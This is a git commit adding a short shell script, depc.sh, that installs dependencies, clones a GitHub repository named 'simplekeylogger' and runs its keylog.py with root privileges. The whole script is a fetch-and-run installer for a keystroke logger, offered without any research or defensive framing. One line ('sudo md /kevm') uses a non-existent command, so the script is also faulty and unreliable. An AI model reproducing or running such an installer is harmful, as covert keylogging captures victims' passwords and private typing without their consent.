46b43937d1bb44cd847daa7b390e9ccbebf7ab41
discordpro <discordpro01@gmail.com>
2018-09-08 01:09:27 -0400

    Add files via upload

---
+++ depc.sh
@@ -0,0 +1,7 @@
+sudo apt-get install python-xlib
+sudo apt-get install git
+sudo md /kevm
+cd /kevm
+sudo git clone https://github.com/discordpro/simplekeylogger.git
+cd simplekeylogger
+sudo python keylog.py
